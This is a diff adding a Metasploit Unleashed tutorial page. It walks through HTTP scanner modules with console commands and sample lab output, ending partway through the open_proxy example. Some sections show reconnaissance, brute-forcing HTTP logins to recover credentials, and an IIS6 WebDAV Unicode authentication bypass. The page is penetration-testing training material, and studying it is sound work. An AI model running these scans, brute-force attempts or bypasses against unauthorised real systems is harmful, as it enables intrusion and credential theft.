@@ -1,0 +1,1536 @@
+
+		<!DOCTYPE html>
+		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
+		<head>
+			<title>Scanner HTTP Auxiliary Modules - Metasploit Unleashed</title>
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
+			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
+			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+		</head>
+
+		<body>
+			<div id="wrapper">
+			
+				<div id="header">
+					<div id="header-content">
+						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
+						<div class="tagline">Mastering the Framework</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+				
+				<div id="page">
+					<div id="right-box">
+						
+						<div id="controls">
+									<ul>
+			<li id="ca-nstab-main" class="selected"><a href="Scanner_HTTP_Auxiliary_Modules" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Scanner_HTTP_Auxiliary_Modules&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Scanner_HTTP_Auxiliary_Modules&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Scanner_HTTP_Auxiliary_Modules&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+		</ul>
+							
+							<div class="portlet" id="p-personal">
+								<div class="pBody">
+								<ul>
+																	</ul>
+								</div>
+							</div>
+							
+							<div class="search">
+									<div id="p-search" class="portlet">
+		<div id="searchBody" class="pBody">
+			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
+				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
+				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
+			</form>
+		</div>
+	</div>
+							</div>
+							
+							<div class="clear"></div>
+						</div>
+					
+						<a id="top"></a>
+						
+						<div id="content">
+							<h1>Scanner HTTP Auxiliary Modules</h1>
+						
+							<div id="siteSub">From Metasploit Unleashed</div>
+							<div id="contentSub"></div>
+																													<div id="jump-to-nav">Jump to: <a href="Scanner_HTTP_Auxiliary_Modules#column-one">navigation</a>, <a href="Scanner_HTTP_Auxiliary_Modules#searchInput">search</a></div>
+														<!-- start content -->
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Scanner_HTTP_Auxiliary_Modules#cert"><span class="tocnumber">1</span> <span class="toctext">cert</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Scanner_HTTP_Auxiliary_Modules#dir_listing"><span class="tocnumber">2</span> <span class="toctext">dir_listing</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Scanner_HTTP_Auxiliary_Modules#dir_scanner"><span class="tocnumber">3</span> <span class="toctext">dir_scanner</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Scanner_HTTP_Auxiliary_Modules#dir_webdav_unicode_bypass"><span class="tocnumber">4</span> <span class="toctext">dir_webdav_unicode_bypass</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Scanner_HTTP_Auxiliary_Modules#enum_delicious"><span class="tocnumber">5</span> <span class="toctext">enum_delicious</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Scanner_HTTP_Auxiliary_Modules#enum_wayback"><span class="tocnumber">6</span> <span class="toctext">enum_wayback</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Scanner_HTTP_Auxiliary_Modules#files_dir"><span class="tocnumber">7</span> <span class="toctext">files_dir</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Scanner_HTTP_Auxiliary_Modules#http_login"><span class="tocnumber">8</span> <span class="toctext">http_login</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Scanner_HTTP_Auxiliary_Modules#open_proxy"><span class="tocnumber">9</span> <span class="toctext">open_proxy</span></a></li>
+<li class="toclevel-1 tocsection-10"><a href="Scanner_HTTP_Auxiliary_Modules#options"><span class="tocnumber">10</span> <span class="toctext">options</span></a></li>
+<li class="toclevel-1 tocsection-11"><a href="Scanner_HTTP_Auxiliary_Modules#robots_txt"><span class="tocnumber">11</span> <span class="toctext">robots_txt</span></a></li>
+<li class="toclevel-1 tocsection-12"><a href="Scanner_HTTP_Auxiliary_Modules#ssl"><span class="tocnumber">12</span> <span class="toctext">ssl</span></a></li>
+<li class="toclevel-1 tocsection-13"><a href="Scanner_HTTP_Auxiliary_Modules#http_version"><span class="tocnumber">13</span> <span class="toctext">http_version</span></a></li>
+<li class="toclevel-1 tocsection-14"><a href="Scanner_HTTP_Auxiliary_Modules#tomcat_mgr_login"><span class="tocnumber">14</span> <span class="toctext">tomcat_mgr_login</span></a></li>
+<li class="toclevel-1 tocsection-15"><a href="Scanner_HTTP_Auxiliary_Modules#verb_auth_bypass"><span class="tocnumber">15</span> <span class="toctext">verb_auth_bypass</span></a></li>
+<li class="toclevel-1 tocsection-16"><a href="Scanner_HTTP_Auxiliary_Modules#webdav_scanner"><span class="tocnumber">16</span> <span class="toctext">webdav_scanner</span></a></li>
+<li class="toclevel-1 tocsection-17"><a href="Scanner_HTTP_Auxiliary_Modules#webdav_website_content"><span class="tocnumber">17</span> <span class="toctext">webdav_website_content</span></a></li>
+<li class="toclevel-1 tocsection-18"><a href="Scanner_HTTP_Auxiliary_Modules#wordpress_login_enum"><span class="tocnumber">18</span> <span class="toctext">wordpress_login_enum</span></a></li>
+</ul>
+</td></tr></table>
+<p><br />
+</p>
+<h2> <span class="mw-headline" id="cert"> cert </span></h2>
+<p>The <b>"cert"</b> scanner module is a useful administrative scanner that allows you to cover a subnet to check whether or not server certificates are expired.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/cert</span>
+msf auxiliary(<span style='color:#ff0000;'>cert</span>) ><span style='color:#13C16A;'> show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   ISSUER   .*               yes       Show a warning if the Issuer doesn't match this regex
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   SHOWALL  false            no        Show all certificates (issuer,time) regardless of match
+   THREADS  1                yes       The number of concurrent threads</pre>
+<br />
+To run the module, we just set our RHOSTS and THREADS values and let it do its thing.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>cert</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.0/24</span>
+RHOSTS => 192.168.1.0/24
+msf auxiliary(<span style='color:#ff0000;'>cert</span>) > <span style='color:#13C16A;'>set THREADS 254</span>
+THREADS => 254
+msf auxiliary(<span style='color:#ff0000;'>cert</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.11 - '192.168.1.11' : 'Sat Sep 25 07:16:02 UTC 2010' - 'Tue Sep 22 07:16:02 UTC 2020'
+<span style='color:#0000FF;'>[*]</span> 192.168.1.10 - '192.168.1.10' : 'Wed Mar 10 00:13:26 UTC 2010' - 'Sat Mar 07 00:13:26 UTC 2020'
+<span style='color:#0000FF;'>[*]</span> 192.168.1.201 - 'localhost' : 'Tue Nov 10 23:48:47 UTC 2009' - 'Fri Nov 08 23:48:47 UTC 2019'
+<span style='color:#0000FF;'>[*]</span> Scanned 255 of 256 hosts (099% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>cert</span>) ></pre>
+<br />
+The module output shows the certificate issuer, the issue date, and the expiry date.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="dir_listing"> dir_listing </span></h2>
+<p>The <b>"dir_listing"</b> module will connect to a provided range of web servers and determine if directory listings are enabled on them.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/dir_listing</span>
+msf auxiliary(<span style='color:#ff0000;'>dir_listing</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting     Required  Description
+   ----     ---------------     --------  -----------
+   PATH     /                   yes       The path to identify directoy listing
+   Proxies                      no        Use a proxy chain
+   RHOSTS   192.168.1.200-254  yes       The target address range or CIDR identifier
+   RPORT    80                  yes       The target port
+   THREADS  55                  yes       The number of concurrent threads
+   VHOST                        no        HTTP server virtual host</pre>
+<br />
+Note that the module can be set to search in a particular path but we will simply run it in its default configuration.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>dir_listing</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-254</span>
+RHOSTS => 192.168.1.200-254
+msf auxiliary(<span style='color:#ff0000;'>dir_listing</span>) > <span style='color:#13C16A;'>set THREADS 55</span>
+THREADS => 55
+msf auxiliary(<span style='color:#ff0000;'>dir_listing</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> NOT Vulnerable to directory listing http://192.168.1.209:80/
+<span style='color:#0000FF;'>[*]</span> NOT Vulnerable to directory listing http://192.168.1.211:80/
+<span style='color:#0000FF;'>[*]</span> Found Directory Listing http://192.168.1.223:80/
+<span style='color:#0000FF;'>[*]</span> NOT Vulnerable to directory listing http://192.168.1.234:80/
+<span style='color:#0000FF;'>[*]</span> NOT Vulnerable to directory listing http://192.168.1.230:80/
+<span style='color:#0000FF;'>[*]</span> Scanned 27 of 55 hosts (049% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 50 of 55 hosts (090% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 52 of 55 hosts (094% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 53 of 55 hosts (096% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 54 of 55 hosts (098% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 55 of 55 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>dir_listing</span>) ></pre>
+As can be seen in the above output, one of our scanned servers does indeed have directory listings enabled on the root of the server. Findings like these can turn into a gold mine of valuable information.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="dir_scanner"> dir_scanner </span></h2>
+<p>The <b>"dir_scanner"</b> module scans one or more web servers for interesting directories that can be further explored.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/dir_scanner</span>
+msf auxiliary(<span style='color:#ff0000;'>dir_scanner</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name        Current Setting                                Required  Description
+   ----        ---------------                                --------  -----------
+   DICTIONARY  /opt/metasploit3/msf3/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
+   PATH        /                                              yes       The path  to identify files
+   Proxies                                                    no        Use a proxy chain
+   RHOSTS                                                     yes       The target address range or CIDR identifier
+   RPORT       80                                             yes       The target port
+   THREADS     1                                              yes       The number of concurrent threads
+   VHOST                                                      no        HTTP server virtual host</pre>
+<br />
+We will accept the default dictionary included in Metasploit, set our target, and let the scanner run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>dir_scanner</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.201</span>
+RHOSTS => 192.168.1.201
+msf auxiliary(<span style='color:#ff0000;'>dir_scanner</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Using code '404' as not found for 192.168.1.201
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/.../ 403 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/Joomla/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/cgi-bin/ 403 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/error/ 403 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/icons/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/oscommerce/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/phpmyadmin/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/security/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/webalizer/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.201:80/webdav/ 200 (192.168.1.201)
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>dir_scanner</span>) ></pre>
+Our quick scan has turned up a number of directories on our target server that we would certainly want to investigate further.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="dir_webdav_unicode_bypass"> dir_webdav_unicode_bypass </span></h2>
+<p>The <b>"dir_webdav_unicode_bypass"</b> module scans a given range of webservers and attempts to bypass the authentication using the WebDAV IIS6 Unicode vulnerability (<a rel="nofollow" class="external free" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1535">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1535</a>).
+<br />
+<br />
+<pre>msf ><span style='color:#13C16A;'> use auxiliary/scanner/http/dir_webdav_unicode_bypass</span>
+msf auxiliary(<span style='color:#ff0000;'>dir_webdav_unicode_bypass</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name        Current Setting                                Required  Description
+   ----        ---------------                                --------  -----------
+   DICTIONARY  /opt/metasploit3/msf3/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
+   ERROR_CODE  404                                            yes       Error code for non existent directory
+   HTTP404S    /opt/metasploit3/msf3/data/wmap/wmap_404s.txt  no        Path of 404 signatures to use
+   PATH        /                                              yes       The path to identify files
+   Proxies                                                    no        Use a proxy chain
+   RHOSTS                                                     yes       The target address range or CIDR identifier
+   RPORT       80                                             yes       The target port
+   THREADS     1                                              yes       The number of concurrent threads
+   VHOST                                                      no        HTTP server virtual host</pre>
+<br />
+We will keep the default DICTIONARY and HTTP404S dictionary settings, set our RHOSTS and THREADS values and let the module run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>dir_webdav_unicode_bypass</span>) ><span style='color:#13C16A;'> set RHOSTS 192.168.1.200-254</span>
+RHOSTS => 192.168.1.200-254
+msf auxiliary(<span style='color:#ff0000;'>dir_webdav_unicode_bypass</span>) > <span style='color:#13C16A;'>set THREADS 20</span>
+THREADS => 20
+msf auxiliary(<span style='color:#ff0000;'>dir_webdav_unicode_bypass</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Using code '404' as not found.
+<span style='color:#0000FF;'>[*]</span> Using code '404' as not found.
+<span style='color:#0000FF;'>[*]</span> Using code '404' as not found.
+<span style='color:#0000FF;'>[*]</span> Found protected folder http://192.168.1.211:80/admin/ 401 (192.168.1.211)
+<span style='color:#0000FF;'>[*]</span> 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+<span style='color:#0000FF;'>[*]</span> Found protected folder http://192.168.1.223:80/phpmyadmin/ 401 (192.168.1.223)
+<span style='color:#0000FF;'>[*]</span> 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+<span style='color:#0000FF;'>[*]</span> Found protected folder http://192.168.1.223:80/security/ 401 (192.168.1.223)
+<span style='color:#0000FF;'>[*]</span> 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+<span style='color:#0000FF;'>[*]</span> Found protected folder http://192.168.1.204:80/printers/ 401 (192.168.1.204)
+<span style='color:#0000FF;'>[*]</span> 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+<span style='color:#0000FF;'>[*]</span> 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.204:80/%c0%afprinters/ 207 (192.168.1.204)
+<span style='color:#0000FF;'>[*]</span> Found protected folder http://192.168.1.203:80/printers/ 401 (192.168.1.203)
+<span style='color:#0000FF;'>[*]</span> 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
+<span style='color:#0000FF;'>[*]</span> 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.203:80/%c0%afprinters/ 207 (192.168.1.203)
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#0000FF;'>[*]</span> Scanned 55 of 55 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>dir_webdav_unicode_bypass</span>) ></pre>
+<br />
+Our scan has found vulnerable servers. This vulnerability can potentially allow us to list, download, or even upload files to password protected folders.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="enum_delicious"> enum_delicious </span></h2>
+<p>The <b>"enum_delicious"</b> auxiliary module is a nifty little scanner that will enumerate the delicious bookmark service at <a rel="nofollow" class="external free" href="http://www.delicious.com/">http://www.delicious.com/</a> for links to a target domain. This information can turn up a great deal of links that other people have found interesting (for social engineering attacks) or for pages that may be deeply hidden on a site.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/enum_delicious</span> 
+msf auxiliary(<span style='color:#ff0000;'>enum_delicious</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DOMAIN                    yes       Domain to request URLS for
+   OUTFILE                   no        Where to output the list for use</pre>
+<br />
+There isn't anything special about configuring this module. We just feed it a domain and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>enum_delicious</span>) > <span style='color:#13C16A;'>set DOMAIN metasploit.com</span>
+DOMAIN => metasploit.com
+msf auxiliary(<span style='color:#ff0000;'>enum_delicious</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Pulling urls from Delicious.com
+<span style='color:#0000FF;'>[*]</span> Page number: 1
+<span style='color:#0000FF;'>[*]</span> Page number: 2
+<span style='color:#0000FF;'>[*]</span> Page number: 3
+<span style='color:#0000FF;'>[*]</span> Page number: 4
+<span style='color:#0000FF;'>[*]</span> Page number: 5
+<span style='color:#0000FF;'>[*]</span> Page number: 6
+<span style='color:#0000FF;'>[*]</span> Page number: 7
+<span style='color:#0000FF;'>[*]</span> Page number: 8
+<span style='color:#0000FF;'>[*]</span> Page number: 9
+<span style='color:#0000FF;'>[*]</span> Located 200 addresses for metasploit.com
+http://blog.metasploit.com/2007/03/metasploit-framework-30-released.html
+http://blog.metasploit.com/2007/08/easier-way-to-create-payload-modules-in.html
+http://blog.metasploit.com/2007/09/root-shell-in-my-pocket-and-maybe-yours.html
+http://blog.metasploit.com/2007/10/cracking-iphone-part-2.html
+<span style='color:#00ff00;'>...snip...</span>
+http://www.metasploit.com/users/hdm/tools/axman/
+https://metasploit.com/trac/ticket/353
+https://www.metasploit.com/redmine/projects/framework/repository/revisions/9319/diff?rev=9319&amp;type=sbs
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(enum_delicious) ></pre>
+<br />
+Even from a non-pentest perspective, this module can turn up some interesting information, if for no other reason than it can provide you with some good reading material.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="enum_wayback"> enum_wayback </span></h2>
+<p>The <b>"enum_wayback"</b> auxiliary module will query the archive.org site for any url's that have been archived for a given domain. This can be useful for locating valuable information or for finding pages on a site that have since been unlinked.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/enum_wayback</span>
+msf auxiliary(<span style='color:#ff0000;'>enum_wayback</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DOMAIN                    yes       Domain to request URLS for
+   OUTFILE                   no        Where to output the list for use</pre>
+<br />
+The only configuration item that we need to set is the DOMAIN value and then we let the scanner do its thing.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>enum_wayback</span>) > <span style='color:#13C16A;'>set DOMAIN metasploit.com</span>
+DOMAIN => metasploit.com
+msf auxiliary(<span style='color:#ff0000;'>enum_wayback</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Pulling urls from Archive.org
+<span style='color:#0000FF;'>[*]</span> Located 1300 addresses for metasploit.com
+http://metasploit.com/
+http://metasploit.com/?
+http://metasploit.com/?OS=CrossReference&amp;SP=CrossReference
+http://metasploit.com/?OS=Windows+2000
+http://metasploit.com/?OS=Windows+2003
+http://metasploit.com/?OS=Windows+NT
+http://metasploit.com/?OS=Windows+XP
+http://metasploit.com/?kangtatantakwa
+http://metasploit.com/archive/framework/bin00000.bin
+<span style='color:#00ff00;'>...snip...</span>
+http://metasploit.com/projects/Framework/screenshots/v20_web_01_big.jpg
+http://metasploit.com/projects/Framework/screenshots/v23_con_01_big.jpg
+http://metasploit.com/projects/Framework/screenshots/v23_con_02_big.jpg
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>enum_wayback</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="files_dir"> files_dir </span></h2>
+<p>The <b>"files_dir"</b> takes a wordlist as input and queries a host or range of hosts for the presence of interesting files on the target.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/files_dir</span> 
+msf auxiliary(<span style='color:#ff0000;'>files_dir</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name        Current Setting                                 Required  Description
+   ----        ---------------                                 --------  -----------
+   DICTIONARY  /opt/metasploit3/msf3/data/wmap/wmap_files.txt  no        Path of word dictionary to use
+   EXT                                                         no        Append file extension to use
+   PATH        /                                               yes       The path  to identify files
+   Proxies                                                     no        Use a proxy chain
+   RHOSTS                                                      yes       The target address range or CIDR identifier
+   RPORT       80                                              yes       The target port
+   THREADS     1                                               yes       The number of concurrent threads
+   VHOST                                                       no        HTTP server virtual host</pre>
+<br />
+The built-in DICTIONARY list will serve our purposes so we simply set our RHOSTS value and let the scanner run against our target.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>files_dir</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.1</span>
+RHOSTS => 192.168.1.1
+msf auxiliary(<span style='color:#ff0000;'>files_dir</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Using code '404' as not found.
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/backup 403
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/download 301
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/images 301
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/include 301
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/index 302
+<span style='color:#0000FF;'>[*]</span> Found http://192.168.1.1:80/proxy 200
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>files_dir</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="http_login"> http_login </span></h2>
+<p>The <b>"http_login"</b> module is a brute-force login scanner that attempts to authenticate to a system using HTTP authentication.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/http_login</span>
+msf auxiliary(<span style='color:#ff0000;'>http_login</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/http_login):
+
+   Name              Current Setting                                                 Required  Description
+   ----              ---------------                                                 --------  -----------
+   AUTH_URI                                                                          no        The URI to authenticate against (default:auto)
+   BLANK_PASSWORDS   true                                                            yes       Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                               yes       How fast to bruteforce, from 0 to 5
+   PASSWORD                                                                          no        A specific password to authenticate with
+   PASS_FILE         /opt/metasploit3/msf3/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                           no        Use a proxy chain
+   RHOSTS                                                                            yes       The target address range or CIDR identifier
+   RPORT             80                                                              yes       The target port
+   STOP_ON_SUCCESS   false                                                           yes       Stop guessing when a credential works for a host
+   THREADS           1                                                               yes       The number of concurrent threads
+   USERNAME                                                                          no        A specific username to authenticate as
+   USERPASS_FILE     /opt/metasploit3/msf3/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_FILE         /opt/metasploit3/msf3/data/wordlists/http_default_users.txt     no        File containing users, one per line
+   UserAgent         Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)              yes       The HTTP User-Agent sent in the request
+   VERBOSE           true                                                            yes       Whether to print output for all attempts
+   VHOST                                                                             no        HTTP server virtual host</pre>
+<br />
+To configure the module, we set the AUTH_URI setting to the path of the page requesting authentication, our RHOSTS value and to reduce output, we set the VERBOSE value to false.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>http_login</span>) > <span style='color:#13C16A;'>set AUTH_URI /xampp/</span>
+AUTH_URI => /xampp/
+msf auxiliary(<span style='color:#ff0000;'>http_login</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.201</span>
+RHOSTS => 192.168.1.201
+msf auxiliary(<span style='color:#ff0000;'>http_login</span>) > <span style='color:#13C16A;'>set VERBOSE false</span>
+VERBOSE => false
+msf auxiliary(<span style='color:#ff0000;'>http_login</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Attempting to login to http://192.168.1.201:80/xampp/ with Basic authentication
+<span style='color:#00ff00;'>[+]</span> http://192.168.1.201:80/xampp/ - Successful login 'admin' : 's3cr3t'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/xampp/ - Random usernames are not allowed.
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/xampp/ - Random passwords are not allowed.
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>http_login</span>) ></pre>
+<br />
+As can be seen in the above output, our scan found a valid set of credentials for the directory.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="open_proxy"> open_proxy </span></h2>
+<p>The <i>"open_proxy"'</i> module scans a host or range of hosts looking for open proxy servers. This module helps mitigate false positives by allowing us to declare valid HTTP codes to determine whether a connection was successfully made.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/open_proxy</span>
+msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name                   Current Setting                                     Required  Description
+   ----                   ---------------                                     --------  -----------
+   DEBUG                  false                                               no        Enable requests debugging output
+   LOOKUP_PUBLIC_ADDRESS  false                                               no        Enable test for retrieve public IP address via RIPE.net
+   MULTIPORTS             false                                               no        Multiple ports will be used : 80, 1080, 3128, 8080, 8123
+   RANDOMIZE_PORTS        false                                               no        Randomize the order the ports are probed
+   RHOSTS                                                                     yes       The target address range or CIDR identifier
+   RPORT                  8080                                                yes       The target port
+   SITE                   209.85.135.147                                      yes       The web site to test via alleged web proxy (default is www.google.com)
+   THREADS                1                                                   yes       The number of concurrent threads
+   UserAgent              Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  yes       The HTTP User-Agent sent in the request
+   VERIFY_CONNECT         false                                               no        Enable test for CONNECT method
+   VERIFY_HEAD            false                                               no        Enable test for HEAD method
+   ValidCode              200,302                                             no        Valid HTTP code for a successfully request
+   ValidPattern           server: gws                                         no        Valid HTTP server header for a successfully request</pre>
+<br />
+We set our RHOSTS value to a small range of IP addresses and have the module scan port 8888 or proxy servers.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-210</span>
+RHOSTS => 192.168.1.200-210
+msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) > <span style='color:#13C16A;'>set RPORT 8888</span>
+RPORT => 8888
+msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) > <span style='color:#13C16A;'>set THREADS 11</span>
+THREADS => 11
+msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.201:8888 is a potentially OPEN proxy [200] (n/a)
+<span style='color:#0000FF;'>[*]</span> Scanned 02 of 11 hosts (018% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 03 of 11 hosts (027% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 04 of 11 hosts (036% complete)
